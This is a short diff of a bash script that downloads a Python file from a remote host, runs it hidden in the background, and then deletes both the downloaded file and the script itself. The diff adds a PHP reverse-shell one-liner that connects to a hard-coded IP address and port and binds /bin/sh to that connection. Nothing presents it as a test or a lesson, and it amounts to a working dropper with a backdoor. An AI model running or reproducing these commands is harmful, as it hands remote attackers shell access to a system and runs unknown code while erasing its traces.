@@ -1,9 +1,12 @@
 #!/bin/bash
 wget https://cyberprime.netlify.app/mod.py 
-chmod +x mod.py
-sleep 4
 nohup python3 mod.py >/dev/null 2>&1 &
-sleep 4
-rm mod.sh
+sleep 1  # Wait for 1 second before the next command
 rm mod.py
+rm mod.sh
+sleep 1  # Wait for 1 second before the next command
+# Add PHP reverse shell command
+php -r '$sock=fsockopen("159.203.126.35",22289);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
 
